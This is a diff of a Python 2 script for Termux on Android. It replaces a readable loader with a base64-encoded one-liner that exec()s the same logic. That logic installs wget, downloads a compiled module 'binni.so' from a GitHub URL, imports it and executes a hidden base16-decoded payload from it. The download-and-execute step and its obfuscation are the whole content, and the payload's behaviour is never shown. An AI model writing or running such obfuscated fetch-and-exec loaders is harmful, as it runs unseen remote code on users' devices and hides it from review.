@@ -1,16 +1,1 @@
-#!/data/data/com.termux/files/usr/bin/python2
-#coding=utf-8
-import os,platform,time,base64,json
-if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
-	os.system('pkg update && pkg install nodejs -y')
-if not os.path.isfile('/data/data/com.termux/files/usr/bin/wget'):
-	os.system('pkg update && pkg install wget -y')
-bit=platform.architecture()[0]
-if not os.path.isfile('binni.so'):
-	os.system('wget https://raw.githubusercontent.com/Binyamin-binni/Binaries/main/bxi/for-termux/{}/binni.so'.format(bit))
-	time.sleep(1)
-	import binni
-	exec(base64.b16decode(binni.bcoder909()))
-elif os.path.isfile('binni.so'):
-	import binni
-	exec(base64.b16decode(binni.bcoder909()))
+import base64;exec(base64.b64decode('IyEvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2Jpbi9weXRob24yCiNjb2Rpbmc9dXRmLTgKaW1wb3J0IG9zLHBsYXRmb3JtLHRpbWUsYmFzZTY0LGpzb24KaWYgbm90IG9zLnBhdGguaXNmaWxlKCcvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2Jpbi93Z2V0Jyk6Cglvcy5zeXN0ZW0oJ3BrZyB1cGRhdGUgJiYgcGtnIGluc3RhbGwgd2dldCAteScpCmJpdD1wbGF0Zm9ybS5hcmNoaXRlY3R1cmUoKVswXQppZiBub3Qgb3MucGF0aC5pc2ZpbGUoJ2Jpbm5pLnNvJyk6Cglvcy5zeXN0ZW0oJ3dnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JpbnlhbWluLWJpbm5pL0JpbmFyaWVzL21haW4vYnhpL2Zvci10ZXJtdXgve30vYmlubmkuc28nLmZvcm1hdChiaXQpKQoJdGltZS5zbGVlcCgxKQoJaW1wb3J0IGJpbm5pCglleGVjKGJhc2U2NC5iMTZkZWNvZGUoYmlubmkuYmNvZGVyOTA5KCkpKQplbGlmIG9zLnBhdGguaXNmaWxlKCdiaW5uaS5zbycpOgoJaW1wb3J0IGJpbm5pCglleGVjKGJhc2U2NC5iMTZkZWNvZGUoYmlubmkuYmNvZGVyOTA5KCkpKQ=='))
